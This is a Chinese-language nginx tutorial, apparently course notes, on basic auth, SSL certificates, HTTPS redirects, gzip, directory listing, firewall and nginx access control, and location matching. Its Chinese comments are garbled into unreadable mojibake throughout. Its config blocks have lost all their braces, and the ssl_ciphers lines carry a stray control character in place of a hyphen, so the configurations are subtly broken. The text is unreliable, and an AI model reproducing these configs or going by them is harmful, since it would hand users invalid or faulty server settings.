lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf[root@web01 conf.d]# vim b.jaden.com.conf server listen 80; server_name b.jaden.com; access_log /opt/nginx/b.jaden.com_log jaden; location / auth_basic b.jaden.com; auth_basic_user_file /etc/nginx/htpasswd; root /web/two; index index.html index.htm; # ä¿å­˜ä¹‹åé‡æ–°å¯åŠ¨nginxå°±å¯ä»¥äº† 3.17.7 sslè¯ä¹¦é…ç½®# å°†è¯ä¹¦æ”¾åˆ°optç›®å½•çš„certä¸‹ï¼Œcertéœ€è¦æˆ‘ä»¬è‡ªå·±åˆ›å»ºï¼Œå…¶å®åå­—éšä¾¿èµ·ï¼Œä¸€èˆ¬éƒ½å«certï¼Œè¡¨ç¤ºè¯ä¹¦çš„æ„æ€ [root@web01 conf.d]# cd /opt/ [root@web01 opt]# mkdir cert [root@web01 opt]# cd cert/ [root@web01 cert]# unzip 9683539_wulaoban.top_nginx.zip [root@web01 cert]# ls 9683539_wulaoban.top.key 9683539_wulaoban.top.pem 9683539_wulaoban.top_nginx.zip #é˜¿é‡Œäº‘çš„nginxçš„è¯ä¹¦éƒ¨ç½²æ–‡æ¡£ä¸­å»ºè®®å¦‚ä¸‹çš„é…ç½®ï¼š#ä»¥ä¸‹å±æ€§ä¸­ï¼Œä»¥sslå¼€å¤´çš„å±æ€§è¡¨ç¤ºä¸è¯ä¹¦é…ç½®æœ‰å…³ã€‚server #é…ç½®HTTPSçš„é»˜è®¤è®¿é—®ç«¯å£ä¸º443ã€‚ #å¦‚æœæœªåœ¨æ­¤å¤„é…ç½®HTTPSçš„é»˜è®¤è®¿é—®ç«¯å£ï¼Œå¯èƒ½ä¼šé€ æˆNginxæ— æ³•å¯åŠ¨ã€‚ #å¦‚æœæ‚¨ä½¿ç”¨Nginx 1.15.0åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œè¯·ä½¿ç”¨listen 443 sslä»£æ›¿listen 443å’Œssl onã€‚ listen 443 ssl; # http--80 https -- 443 #å¡«å†™è¯ä¹¦ç»‘å®šçš„åŸŸå server_name yourdomain; root html; index index.html index.htm; #å¡«å†™è¯ä¹¦æ–‡ä»¶åç§° ssl_certificate cert/cert-file-name.pem; #å¡«å†™è¯ä¹¦ç§é’¥æ–‡ä»¶åç§° ssl_certificate_key cert/cert-file-name.key; ssl_session_timeout 5m; #è¡¨ç¤ºä½¿ç”¨çš„åŠ å¯†å¥—ä»¶çš„ç±»å‹ ssl_ciphers ECDHE-RSA-AES128-GCM\u0002SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #è¡¨ç¤ºä½¿ç”¨çš„TLSåè®®çš„ç±»å‹ï¼Œæ‚¨éœ€è¦è‡ªè¡Œè¯„ä¼°æ˜¯å¦é…ç½®TLSv1.1åè®®ã€‚ ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; ssl_prefer_server_ciphers on; location / #Webç½‘ç«™ç¨‹åºå­˜æ”¾ç›®å½• root html; index index.html index.htm; #æ¯”å¦‚ï¼Œæˆ‘ä»¬æŒ‰ç…§è‡ªå·±çš„ç½‘ç«™ä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ï¼šserver listen 443 ssl; server_name www.wulaoban.top; ssl_certificate /opt/cert/9683539_wulaoban.top.pem; ssl_certificate_key /opt/cert/9683539_wulaoban.top.key; ssl_session_timeout 5m; #è¡¨ç¤ºä½¿ç”¨çš„åŠ å¯†å¥—ä»¶çš„ç±»å‹ ssl_ciphers ECDHE-RSA-AES128-GCM\u0002SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #è¡¨ç¤ºä½¿ç”¨çš„TLSåè®®çš„ç±»å‹ï¼Œæ‚¨éœ€è¦è‡ªè¡Œè¯„ä¼°æ˜¯å¦é…ç½®TLSv1.1åè®®ã€‚ ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # å¦‚æœä¸åŠ TLSv1.1ï¼Œå°±åˆ æ‰ ssl_prefer_server_ciphers on; location / #Webç½‘ç«™ç¨‹åºå­˜æ”¾ç›®å½• root /web/www.wulaoban.top; index index.html index.htm; # åœ¨/webç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåå«www.wulaoban.topçš„æ–‡ä»¶å¤¹## ç¬¬ä¸€æ­¥ï¼šç”³è¯·åŸŸåï¼Œç„¶åç”³è¯·è¯ä¹¦ï¼ŒæŠŠè¯ä¹¦ä¸‹è½½ä¸‹æ¥## ç¬¬äºŒæ­¥ï¼šä¿®æ”¹nginxå¯¹åº”ç½‘ç«™çš„é…ç½®æ–‡ä»¶## ç¬¬ä¸‰æ­¥ï¼šå‡†å¤‡ç«™ç‚¹æºä»£ç #ç¬¬å››æ­¥ï¼šå› ä¸ºå¤§å®¶æ²¡æœ‰çœŸå®åŸŸåï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹hostsæ–‡ä»¶ï¼ŒåŠ ä¸€ä¸ªdnsè§£æè®°å½• 192.168.61.139 www.wulaoban.top## ç¬¬äº”æ­¥ï¼šè®¿é—®https://www.wulaoban.top/smallboll/##å¦å¤–ï¼šæˆ‘ä»¬è¿˜å¯ä»¥æŠŠsmallbollé‡Œé¢çš„æ–‡ä»¶æ‹·è´åˆ°ç«™ç‚¹æ ¹ç›®å½•ä¸­ï¼Œå°±ä¸ç”¨åŠ ä¸Š/smallboll/æ¥è®¿é—®äº†ã€‚ 3.17.8 return#ä½¿ç”¨returnè·³è½¬server access_log off; # è¿™æ®µé…ç½®æ˜¯ä¸“é—¨ç”¨æ¥åšè·³è½¬ç”¨çš„ï¼Œæ‰€ä»¥æ—¥å¿—å°±ä¸ç”¨è®°å½•äº†ï¼Œoffå°±æ˜¯å…³é—­è·³è½¬è¡Œä¸ºçš„æ—¥å¿—è®°å½• listen 80; server_name www.wulaoban.top; location / return 302 https://www.wulaoban.top$request_uri; # å½“ç”¨æˆ·è®¿é—®www.wulaoban.topçš„80ç«¯å£æ—¶ï¼Œè‡ªåŠ¨è·³è½¬åˆ°httpsç½‘å€ã€‚ æ¼”ç¤º [root@web01 ~]# cd /etc/nginx/conf.d/[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf www.wulaoban.top.conf[root@web01 conf.d]# vim www.wulaoban.top.conf # åœ¨ä¸€ä¸ªç½‘ç«™é…ç½®æ–‡ä»¶ä¸­ï¼Œå…¶å®å¯ä»¥å†™å¤šä¸ªserverï¼Œå¦‚ä¸‹server listen 443 ssl; server_name www.wulaoban.top; ssl_certificate /opt/cert/9683539_wulaoban.top.pem; ssl_certificate_key /opt/cert/9683539_wulaoban.top.key; ssl_session_timeout 5m; #è¡¨ç¤ºä½¿ç”¨çš„åŠ å¯†å¥—ä»¶çš„ç±»å‹ ssl_ciphers ECDHE-RSA-AES128-GCM\u0002SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #è¡¨ç¤ºä½¿ç”¨çš„TLSåè®®çš„ç±»å‹ï¼Œæ‚¨éœ€è¦è‡ªè¡Œè¯„ä¼°æ˜¯å¦é…ç½®TLSv1.1åè®®ã€‚ ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # å¦‚æœä¸åŠ TLSv1.1ï¼Œå°±åˆ æ‰ ssl_prefer_server_ciphers on; location / #Webç½‘ç«™ç¨‹åºå­˜æ”¾ç›®å½• root /web/www.wulaoban.top; index index.html index.htm; server listen 80; server_name www.wulaoban.top; location / root /web/www.wulaoban.top; index index.html index.htm; # ç°åœ¨çš„æ„æ€æ˜¯ï¼Œä¸ç„¶ä½ æ˜¯httpè¿˜æ˜¯httpsï¼Œéƒ½å¯ä»¥è®¿é—®åˆ°æˆ‘ä»¬çš„www.wulaoban.topè¿™ä¸ªç½‘ç«™ï¼Œä½†æ˜¯httpè®¿é—®çš„å°±æ˜¯80ç«¯å£ï¼Œä¸å®‰å…¨çš„è®¿é—®ï¼Œhttpsè®¿é—®çš„æ˜¯443ç«¯å£ï¼Œå®‰å…¨çš„è®¿é—®ï¼Œæ•ˆæœå¦‚ä¸‹å›¾ æ‰€ä»¥æˆ‘ä»¬åº”è¯¥è®©ä»–ä½¿ç”¨httpçš„æ—¶å€™è‡ªåŠ¨è·³è½¬ä¸ºhttpsçš„è®¿é—®ã€‚å¦‚ä¸‹ [root@web01 conf.d]# vim www.wulaoban.top.conf # åœ¨ä¸€ä¸ªç½‘ç«™é…ç½®æ–‡ä»¶ä¸­ï¼Œå…¶å®å¯ä»¥å†™å¤šä¸ªserverï¼Œå¦‚ä¸‹server listen 443 ssl; server_name www.wulaoban.top; ssl_certificate /opt/cert/9683539_wulaoban.top.pem; ssl_certificate_key /opt/cert/9683539_wulaoban.top.key; ssl_session_timeout 5m; #è¡¨ç¤ºä½¿ç”¨çš„åŠ å¯†å¥—ä»¶çš„ç±»å‹ ssl_ciphers ECDHE-RSA-AES128-GCM\u0002SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #è¡¨ç¤ºä½¿ç”¨çš„TLSåè®®çš„ç±»å‹ï¼Œæ‚¨éœ€è¦è‡ªè¡Œè¯„ä¼°æ˜¯å¦é…ç½®TLSv1.1åè®®ã€‚ ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # å¦‚æœä¸åŠ TLSv1.1ï¼Œå°±åˆ æ‰ ssl_prefer_server_ciphers on; location / #Webç½‘ç«™ç¨‹åºå­˜æ”¾ç›®å½• root /web/www.wulaoban.top; index index.html index.htm; server listen 80; server_name www.wulaoban.top; location / return 302 https://www.wulaoban.top$request_uri; # è·³è½¬ï¼Œ302æ˜¯çŠ¶æ€ç ï¼Œè¡¨ç¤ºé‡å®šå‘ï¼Œä¹Ÿå°±æ˜¯è·³è½¬ï¼Œåé¢å†è¯´ # å¯ä»¥å…ˆå»æ‰$request_uriæ¥çœ‹çœ‹æ•ˆæœ# $request_uriçš„æ„æ€æ˜¯ç½‘å€uriï¼Œè¿™ä¸ªè®¿é—®http://www.wulaoban.topç½‘å€åé¢ä¸ç®¡åŠ ä»€ä¹ˆå†…å®¹ï¼Œä¸ç®¡è®¿é—®å“ªä¸ªé¡µé¢è·¯å¾„ï¼Œéƒ½ç›´æ¥è·³è½¬åˆ°https# URL: åè®®(http/https):// + ä¸»æœº(ip/åŸŸå) + ç«¯å£(80/443) + uri(/xx/index.htmlæˆ–è€…/xx/xx.jpgç­‰)# æ¯”å¦‚è®¿é—®http://www.wulaoban.top/jaden/ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°è¿™ä¸ªhttps://www.wulaoban.top/jaden/ï¼Œè¿˜æ˜¯è¿™ä¸ªé¡µé¢ï¼Œä½†æ˜¯æ˜¯httpsåè®®çš„ 3.17.9 rewriteè¿™ä¸ªå†™æ³•æ¯”returné‚£ä¸ªéš¾ç†è§£ï¼Œéœ€è¦å†™æ­£åˆ™ï¼Œæ‰€ä»¥ç°åœ¨ç”¨returnæ¥ç©çš„å±…å¤š #ä½¿ç”¨rewriteè·³è½¬server access_log off; listen 80; server_name www.wulaoban.top; location / rewrite ^/(.*) https://www.wulaoban.top/$1 redirect; # redirectä»£è¡¨302çŠ¶æ€ç ï¼Œä¸´æ—¶è·³è½¬ï¼Œ^ä»£è¡¨ç½‘å€https://www.wulaoban.topï¼Œ/(.*)å…¶å®å°±æ˜¯åŒ¹é…uriï¼Œ$1è¡¨ç¤º()ä¸­åŒ¹é…åˆ°çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯.*åŒ¹é…åˆ°çš„å†…å®¹ # rewrite ^/(.*) https://www.wulaoban.top/$1 permanent; # permanentä»£è¡¨301çŠ¶æ€ç ï¼Œæ°¸ä¹…è·³è½¬ æˆ‘ä»¬é…ç½®äº†é™æ€ipçš„è¿™ä¸ªNATæ¨¡å¼çš„è™šæ‹Ÿæœºä¸èƒ½ä¸Šç½‘æ˜¯å› ä¸ºè¢«NetworkManagerç»™å¹²æ‰°äº†ï¼Œå…³é—­ä¸€ä¸‹å®ƒå³å¯ # åœ¨CentOSä¸­æœ‰NetworkManagerå’Œnetworkä¸¤ç§ç½‘ç»œç®¡ç†å·¥å…·,å¦‚æœè¿™ä¸¤ç§æœåŠ¡éƒ½å·¥ä½œæ—¶ä¼šäº§ç”Ÿå†²çªè¿›è€Œå¯¼è‡´æœºå™¨æ— æ³•è”ç½‘ã€‚systemctl stop NetworkManagersystemctl disable NetworkManager# åœ¨é‡å¯ç½‘å¡systemctl restart network# route -nå°±çœ‹åˆ°æœ‰ç½‘å…³äº†ã€‚ é…ç½®é¢å¤–çš„è·³è½¬ # é€šè¿‡curlå¯ä»¥æŸ¥çœ‹ç½‘å€çš„è·³è½¬ç»†èŠ‚ï¼Œå¦‚ä¸‹curl -v http://www.jd.com# ä¸ç®¡æˆ‘ä»¬è®¿é—®www.jd.com/jd.com/http://www.jd.coméƒ½ä¼šè‡ªåŠ¨è·³è½¬åˆ°https://www.jd.com# æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦é…ç½®ä¸¤ä¸ªè·³è½¬ï¼Œå¦‚ä¸‹server listen 80; server_name www.wulaoban.top; location / return 302 https://www.wulaoban.top$request_uri; server listen 80; server_name wulaoban.top; # ç”¨æˆ·è¾“å…¥ä¸å¸¦wwwçš„æ—¶å€™ä¹Ÿèƒ½è·³è½¬åˆ°httpsçš„ç½‘å€ä¸Š location / return 302 https://www.wulaoban.top$request_uri; 3.17.10 Nginxçš„ gzipå‹ç¼©nginxé‡‡ç”¨çš„å‹ç¼©æ–¹å¼æ˜¯gzip [root@web01 ~]# cd ~[root@web01 ~]# llæ€»ç”¨é‡ 4-rw------- 1 root root 1304 3æœˆ 15 20:14 anaconda-ks.cfg[root@web01 ~]# gzip anaconda-ks.cfg [root@web01 ~]# llæ€»ç”¨é‡ 4-rw------- 1 root root 747 3æœˆ 15 20:14 anaconda-ks.cfg.gz# å¯ä»¥çœ‹åˆ°gzipå‹ç¼©çš„æ–‡ä»¶è¿˜æ˜¯å°äº†å¾ˆå¤šçš„ï¼Œè€Œä¸”åŸæ–‡ä»¶æ²¡æœ‰äº†ï¼Œåªå‰©ä¸‹å‹ç¼©æ–‡ä»¶äº† nginxä¸ºä»€ä¹ˆå‹ç¼©å‘¢ï¼Ÿä¸ºäº†çœæµé‡ã€åŠ å¿«ä¼ è¾“é€Ÿåº¦ã€‚æœåŠ¡ç«¯çš„æµé‡éƒ½æ˜¯è¦èŠ±é’±çš„ã€‚å°¤å…¶æ˜¯è¦åšåŠ é€Ÿçš„ç½‘ç«™ï¼Œæ¯”å¦‚CDNåŠ é€Ÿï¼Œéƒ½æ˜¯è¦æ”¶å–æµé‡è´¹çš„ã€‚ å°†ä¸‹é¢çš„æ‰€æœ‰é…ç½®å…¨éƒ¨æ‹·è´åˆ°æˆ‘ä»¬nginxçš„ç½‘ç«™é…ç½®ä¸Šï¼Œå“ªä¸ªç½‘ç«™éœ€è¦é…ç½®ï¼Œå°±ç»™å“ªä¸ªç½‘ç«™é…ç½®ã€‚ gzip on; #å¼€å¯gzipå‹ç¼© gzip_min_length 1k; #æœ€å°å‹ç¼©æ–‡ä»¶ï¼Œå°äº1KBçš„å°±ä¸å‹ç¼©äº† gzip_buffers 4 32k; #å†…å­˜ç¼“å†²ï¼Œå‹ç¼©éœ€è¦æå‰è§„åˆ’ä¸€äº›å†…å­˜ç©ºé—´å‡ºæ¥ï¼Œ4ä¸ª32KBçš„ç©ºé—´ gzip_http_version 1.1; #httpç‰ˆæœ¬ï¼Œé»˜è®¤æ˜¯1.0ï¼Œ1.1éœ€è¦è‡ªå·±å£°æ˜ï¼Œä¸è¿‡ç°åœ¨æ¯”è¾ƒæ–°çš„nginxåº”è¯¥é»˜è®¤å°±æ˜¯1.1äº† gzip_comp_level 9; #å‹ç¼©ç­‰çº§ï¼Œç­‰çº§æ•°1-9ï¼Œå‹ç¼©ç­‰çº§è¶Šé«˜ï¼Œå‹ç¼©ç”¨çš„æ—¶é•¿è¶Šé•¿ï¼Œä½†æ˜¯å‹ç¼©çš„å°±è¶Šå° gzip_types text/html text/css text/xml application/javascript; #å‹ç¼©çš„æ–‡ä»¶ç±»å‹ï¼Œè¿™äº›ç±»å‹çš„æ–‡ä»¶æ‰ä¼šè¢«å‹ç¼©ï¼Œä¸ºä»€ä¹ˆå‹ç¼©çš„éƒ½æ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œè€Œä¸å‹ç¼©å›¾ç‰‡ã€è§†é¢‘å’ŒéŸ³é¢‘ç­‰å¤šåª’ä½“æ–‡ä»¶å‘¢ï¼Œå› ä¸ºæ–‡æœ¬æ–‡ä»¶çš„å‹ç¼©æ¯”æ˜¯æœ€é«˜çš„ï¼Œå€¼å¾—å‹ç¼©ã€‚ æ¯”å¦‚jgpå›¾ç‰‡æ–‡ä»¶ï¼Œè¿™ç§æ ¼å¼çš„å›¾ç‰‡æœ¬èº«å°±æ˜¯å‹ç¼©è¿‡çš„æ–‡ä»¶ï¼Œå†å‹ç¼©çš„æ„ä¹‰ä¸å¤§ã€‚ gzip_vary on; #httpå“åº”å¤´æ·»åŠ gzipæ ‡è¯† gzip_disable MSIE [1-7]\\.; #é‡åˆ°IEæµè§ˆå™¨1-7å–æ¶ˆgzipå‹ç¼© gzip on; gzip_min_length 1k; gzip_buffers 4 32k; gzip_http_version 1.1; gzip_comp_level 9; gzip_types text/html text/css text/xml application/javascript; gzip_vary on; gzip_disable MSIE [1-7]\\.; é…ç½®è‡ªåŠ¨å‹ç¼©ï¼š server listen 80; server_name a.jaden.com; access_log /opt/nginx/a.jaden.com_log jaden; location / # æ·»åŠ åˆ°è¿™é‡Œå³å¯ gzip on; #å¼€å¯gzipå‹ç¼© gzip_min_length 1k; #æœ€å°å‹ç¼©æ–‡ä»¶ gzip_buffers 4 32k; #å†…å­˜ç¼“å†² gzip_http_version 1.1; #httpç‰ˆæœ¬ gzip_comp_level 9; #å‹ç¼©ç­‰çº§ gzip_types text/html text/css text/xml application/javascript; # å‹ç¼©ç±»å‹ gzip_vary on; #httpå“åº”å¤´æ·»åŠ gzipæ ‡è¯† gzip_disable MSIE [1-7]\\.; #é‡åˆ°IEæµè§ˆå™¨1-7å–æ¶ˆgzipå‹ç¼© root /web/one; index index.html index.htm; 3.17.11 Nginxçš„ç›®å½•æµè§ˆåŠŸèƒ½æ³¨æ„ï¼šç½‘ç«™è·Ÿç›®å½•ä¸èƒ½æœ‰indexhtmlæˆ–index.htmæ–‡ä»¶ # å¦‚ä¸‹ä¸¤ä¸ªé…ç½®å³å¯ï¼šautoindex on; # å¼€å¯ç›®å½•æµè§ˆåŠŸèƒ½autoindex_exact_size off; #æ˜¾ç¤ºæ–‡ä»¶å¤§å°çš„æ—¶å€™å¸¦å•ä½ # é…ç½®åœ¨nginxç½‘ç«™é…ç½®çš„serveré…ç½®ä¸­ï¼š server listen 80 default_server; server_name c.jaden.com; access_log /opt/nginx/c.jaden.com_log jaden; ## ç›®å½•æµè§ˆåŠŸèƒ½ autoindex on; # è¿™é‡Œ autoindex_exact_size off; # è¿™é‡Œ location / root /web/three; index index.html index.htm; æ•ˆæœå¦‚ä¸‹ï¼š 3.17.12 Nginxçš„è®¿é—®æ§åˆ¶è®¿é—®æ§åˆ¶è¡Œä¸ºæ— éå°±ä¸¤ç§ï¼Œå…è®¸(åŠ ç™½)å’Œç¦æ­¢(åŠ é»‘) è®¿é—®æ§åˆ¶æœ‰ä¸¤ä¸ªæ–¹å¼ï¼Œä¸€ç§æ˜¯åœ¨OSIæ¨¡å‹çš„å››å±‚ä¼ è¾“å±‚ï¼Œä¸€ç§æ˜¯åœ¨ç¬¬ä¸ƒå±‚åº”ç”¨å±‚ã€‚ä¸»æœºé˜²ç«å¢™å°±æ˜¯åœ¨å››å±‚æ§åˆ¶ï¼Œnginxå°±æ˜¯åœ¨ä¸ƒå±‚æ§åˆ¶ã€‚ æ¼”ç¤ºè®¿é—®æ§åˆ¶ï¼Œéœ€è¦å¼€å¯é˜²ç«å¢™ # ç¤ºä¾‹1ï¼šé˜²ç«å¢™ç›´æ¥ç¦ç”¨ipåœ°å€ï¼Œè¿™æ˜¯åŸºäºå››å±‚çš„æ•ˆæœsystemctl start firewalld.service #å¼€å¯ä¸»æœºé˜²ç«å¢™# æ‹‰é»‘æŸäº›ipåœ°å€ï¼š firewall-cmd --add-rich-rule=rule family=ipv4 source address=116.255.196.0/24 drop firewall-cmd --add-rich-rule=rule family=ipv4 source address=123.44.22.55 drop# æ¯”å¦‚æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç³»ç»Ÿè¿œç¨‹è¿æ¥äº†å“ªäº›ipåœ°å€[root@web01 conf.d]# w12:52:50 up 4:11, 3 users, load average: 0.00, 0.01, 0.04USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot tty1 08:41 4:11m 0.01s 0.01s -bashroot pts/0 192.168.61.1 08:52 2.00s 0.12s 0.00s wroot pts/1 192.168.61.1 08:43 57:22 0.07s 0.07s -bash # å¯ä»¥çœ‹åˆ°192.168.61.1ï¼Œè¿™æ˜¯æˆ‘ä»¬NATæ¨¡å¼çš„ç½‘å¡çš„ç½‘å…³ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„ç‰©ç†æœºå…¶å®æ˜¯ä½¿ç”¨çš„VMnet8è™šæ‹Ÿç½‘å¡çš„ipåœ°å€è¿›è¡Œè¿æ¥çš„ï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡é˜²ç«å¢™å°†è¿™ä¸ªipåœ°å€ç»™å°äº†ï¼Œé‚£ä¹ˆå†å»ºç«‹æ–°çš„sshè¿æ¥åº”è¯¥å°±è¿ä¸ä¸Šè¿™ä¸ªè™šæ‹Ÿæœºäº†ã€‚firewall-cmd --add-rich-rule=rule family=ipv4 source address=192.168.61.1 drop# åŸºäºå››å±‚çš„å°é”ï¼Œæ‰€æœ‰çš„ç½‘ç«™éƒ½è®¿é—®ä¸äº†ã€sshã€ftpç­‰ç­‰éƒ½ä¸è¡Œäº†ã€‚# ç¤ºä¾‹2ï¼šçœ‹ä¸€ä¸‹nginxçš„åŸºäºä¸ƒå±‚çš„è®¿é—®æ§åˆ¶æ•ˆæœsystemctl stop firewalld.service #å…³é—­ä¸»æœºé˜²ç«å¢™# æ‹‰é»‘çš„ï¼Œå«åšåŠ å…¥é»‘åå•ï¼Œè¢«ç¦æ­¢è®¿é—®çš„# åŠ ç™½çš„ï¼Œå«åšåŠ å…¥ç™½åå•ï¼Œæ˜¯å…è®¸è®¿é—®çš„# allow å…è®¸# deny æ‹’ç»# æ¯”å¦‚æˆ‘ä»¬å°†aç½‘ç«™åšä¸€ä¸‹è®¿é—®æ§åˆ¶[root@web01 conf.d]# pwd/etc/nginx/conf.d[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf www.wulaoban.top.conf[root@web01 conf.d]# vim a.jaden.com.conf server listen 80; server_name a.jaden.com; access_log /opt/nginx/a.jaden.com_log jaden; location / deny 192.168.61.1; # é»‘åå•ï¼Œä¸å…è®¸192.168.61.1è®¿é—®è¿™ä¸ªç½‘ç«™ allow 0.0.0.0/0; # ç™½åå•ï¼Œ0.0.0.0/0è¡¨ç¤ºæ‰€æœ‰ipéƒ½åœ¨ç™½åå• gzip on; #... root /web/one; index index.html index.htm; [root@web01 conf.d]# nginx -t # æŸ¥çœ‹è¯­æ³•ä¿¡æ¯çš„æ—¶å€™ï¼Œçœ‹åˆ°ä¸€ä¸ªwarnè­¦å‘Šä¿¡æ¯ï¼Œæç¤ºæœ‰é‡å¤çš„é…ç½®ï¼Œè­¦å‘Šæ²¡äº‹ï¼Œæˆ‘ä»¬åˆ é™¤é‡å¤çš„éƒ¨åˆ†å³å¯gzip_types text/css text/xml application/javascript; #æŠŠé‚£ä¸ªtext/htmlåˆ é™¤ nginx: [warn] duplicate MIME type text/html in /etc/nginx/conf.d/a.jaden.com.conf:13 nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful # é‡å¯æœåŠ¡[root@web01 conf.d]# systemctl restart nginx.service # å†è®¿é—®å°±çœ‹åˆ°403 forbiddenäº†# é»‘åå•å°±æ˜¯å…ˆæ‹’ç»ï¼Œå†å…è®¸æ‰€æœ‰ deny 192.168.61.1; allow 0.0.0.0/0;# ç™½åå•å°±æ˜¯å…ˆå…è®¸ï¼Œå†æ‹’ç»æ‰€æœ‰ allow 192.168.61.1; # ç™½åå• allow 192.168.61.16; # ç™½åå• #allow 192.168.61.16/24; # è¿˜å¯ä»¥å†™åœ°å€æ®µ deny 0.0.0.0/0; # é»‘åå• # å››å±‚ç¦æ­¢(æ˜¾ç¤ºæ— æ³•è¿æ¥)ï¼Œå“ªäº›æƒ…å†µè®¿é—®çš„æ—¶å€™ä¼šçœ‹åˆ°403å‘¢ï¼Œ ## ä¸ƒå±‚ç¦æ­¢ã€ ## æ²¡æœ‰é¦–é¡µhtmlæ–‡ä»¶ã€ ## æ–‡ä»¶æ²¡æœ‰è¯»å–æƒé™ï¼Œ## æ¯”å¦‚nginxè®¿é—®æŸäº›æ–‡ä»¶ï¼Œç”¨çš„nginxç”¨æˆ·èº«ä»½ï¼Œå¦‚æœæŸä¸ªç½‘ç«™çš„æ–‡ä»¶ï¼Œnginxç”¨æˆ·æ²¡æœ‰è¯»å–æƒé™ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯403ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŸä¸ªç½‘ç«™çš„index.htmlæ–‡ä»¶æƒé™ä¿®æ”¹ä¸€ä¸‹çœ‹çœ‹æ•ˆæœ# å¦‚æœæŸä¸ªå…¬å¸çš„ç½‘ç«™éƒ½ä¸æƒ³è®©æŸä¸ªipåœ°å€è®¿é—®ï¼Œé‚£ä¹ˆå°±åœ¨å››å±‚ç¦æ­¢æ¯”è¾ƒæ–¹ä¾¿ã€‚ 3.17.13 locationå’Œä¼˜å…ˆçº§nginxç½‘ç«™é…ç½®å¯ä»¥é…ç½®å¤šä¸ªlocationï¼Œå•ç‹¬å¯¹æŸäº›è®¿é—®è·¯å¾„è¿›è¡Œæ§åˆ¶ã€‚ æ¯”å¦‚ï¼Œå°†ä¸‹é¢è¿™ä¸ªé¡µé¢çš„aç›®å½•çš„è®¿é—®åŠ ä¸€ä¸ªbasicè®¤è¯ server listen 80 default_server; server_name c.jaden.com; access_log /opt/nginx/c.jaden.com_log jaden; autoindex on; autoindex_exact_size off; location / root /web/three; index index.html index.htm; # åŠ ä¸Šå¦‚ä¸‹å†…å®¹ï¼š location /a auth_basic b.jaden.com; auth_basic_user_file /etc/nginx/htpasswd; locationè¿˜å¯ä»¥é…ç½®å¤šä¸ªç«™ç‚¹æ ¹ç›®å½• server listen 80 default_server; server_name c.jaden.com; access_log /opt/nginx/c.jaden.com_log jaden; autoindex on; autoindex_exact_size off; location / root /web/three; index index.html index.htm; # ä¸‹é¢é…ç½®çš„æ„æ€æ˜¯ï¼Œå½“è®¿é—®aç›®å½•çš„æ—¶å€™ï¼Œå…¶å®è®¿é—®çš„æ˜¯/web/a/index.htmlï¼Œè¿™å°±æ˜¯é…ç½®å¤šä¸ªç«™ç‚¹æ ¹ç›®å½•çš„æ„æ€ location /a root /web; æ—¢ç„¶å¯ä»¥é…ç½®å¤šä¸ªç«™ç‚¹æ ¹ç›®å½•ï¼Œé‚£ä¹ˆå¦‚æœè®¿é—®çš„ç›®å½•å†²çªäº†ï¼Œè°ä¼˜å…ˆå‘¢ï¼Œåˆšæ‰çœ‹åˆ°aç›®å½•çš„è®¿é—®æ˜¯ä¸‹é¢çš„ä¼˜å…ˆäº†ï¼Œå¯¹å§ã€‚ä¼˜å…ˆçº§è¿˜èƒ½é€šè¿‡ç¬¦å·æ¥æ§åˆ¶ï¼Œä¸€ä¼šæˆ‘ä»¬æ¥çœ‹ã€‚åŒ¹é…ï¼Œlocationçš„è·¯å¾„æ”¯æŒæ­£åˆ™å†™æ³•ï¼Œäº†è§£å‡ ä¸ªç®€å•çš„å³å¯ #æ²¡æœ‰ç¬¦å·ï¼Œä»£è¡¨æ¨¡ç³ŠåŒ¹é…ï¼Œä¸æ”¯æŒæ­£åˆ™ location /te å¯ä»¥åŒ¹é…teå¼€å¤´çš„ç›®å½•å’Œæ–‡ä»¶~ # è¡¨ç¤ºæ‰§è¡Œä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼ŒåŒºåˆ†å¤§å°å†™~* # è¡¨ç¤ºæ‰§è¡Œä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œä¸åŒºåˆ†å¤§å°å†™= # é’ˆå¯¹çš„æ˜¯æ–‡ä»¶,ç²¾å‡†åŒ¹é…ï¼Œä¸æ”¯æŒæ­£åˆ™ server listen 80 default_server; server_name c.jaden.com; access_log /opt/nginx/c.jaden.com_log jaden; autoindex on; autoindex_exact_size off; location / root /web/three; index index.html index.htm; # ä¸‹é¢æ­£åˆ™çš„æ„æ€æ˜¯ï¼Œåªè¦ç”¨æˆ·è®¿é—®txtæ–‡ä»¶ï¼Œéƒ½è¿”å›404çŠ¶æ€ç ã€‚é‚£ä¹ˆå°±å¯ä»¥åšåˆ°å„ç±»æ–‡ä»¶çš„ä¿æŠ¤ï¼Œæˆ–è€…å„ç§è·¯å¾„è®¿é—®çš„æ§åˆ¶ location ~* ^.*\\.txt$ return 404; # 